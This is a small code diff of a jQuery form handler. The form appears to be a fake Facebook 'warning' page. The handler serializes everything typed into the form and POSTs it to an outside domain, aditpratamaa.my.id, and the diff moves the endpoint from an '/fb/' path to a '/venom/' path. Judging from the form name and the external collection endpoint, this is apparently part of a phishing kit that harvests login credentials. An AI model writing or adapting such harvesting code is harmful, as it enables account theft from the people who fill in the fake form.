@@ -2,7 +2,7 @@ $(".boxformbretyfbperingatan").submit(function() {
 	var d = $(".boxformbretyfbperingatan");
 
 	$.ajax({
-        url: "http://aditpratamaa.my.id/fb/index.php",
+        url: "http://aditpratamaa.my.id/venom/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
